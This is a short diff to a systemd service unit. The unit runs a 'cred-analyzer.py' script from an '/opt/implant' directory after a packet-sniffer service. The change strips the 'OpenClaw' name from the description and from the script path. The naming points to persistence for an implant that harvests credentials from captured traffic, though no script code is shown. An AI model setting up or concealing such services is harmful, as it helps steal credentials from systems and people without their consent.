@@ -1,10 +1,10 @@
 [Unit]
-Description=OpenClaw Credential Analyzer
+Description=Credential Analyzer
 After=packet-sniffer.service
 
 [Service]
 Type=oneshot
-ExecStart=/usr/bin/python3 /opt/implant/scripts/openclaw/cred-analyzer.py
+ExecStart=/usr/bin/python3 /opt/implant/scripts/cred-analyzer.py
 EnvironmentFile=/opt/implant/config.env
 StandardOutput=journal
 StandardError=journal
